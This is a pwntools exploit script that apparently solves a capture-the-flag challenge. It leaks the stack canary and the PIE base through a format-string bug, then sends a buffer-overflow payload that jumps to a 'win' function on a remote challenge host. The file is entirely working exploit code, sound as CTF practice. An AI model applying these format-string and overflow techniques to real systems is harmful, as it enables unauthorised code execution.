from pwn import *

#%21$p

elf = context.binary = ELF("./challenge")
libc = elf.libc

gs = '''
break *main
'''

def conn():
	if args.GDB:
		return gdb.debug(elf.path,gdbscript=gs)
	else:
		return process([elf.path])
	return r

# p = conn()
p = remote("rvcechalls.xyz",33545)
p.recvuntil('is?: ')
#0x5560a9363000 - 0x5560a936433e = 0x133e
p.sendline(b'%17$p\n%21$p')
p.recvuntil("than ")
canary = int(p.recv(18).strip(),16)
print(p.recvline())
base = int(p.recvline().strip(),16) - 0x133e

print(f"Canary : {hex(canary)}")
print(f"Base : {hex(base)}")

win = base + 0x126a
ret = base + 0x1016
offset = 40
payload = b"A"* offset + p64(canary) + p64(ret) + p64(ret) + p64(win) 

p.recvuntil("time: ")
p.sendline(payload)
p.interactive()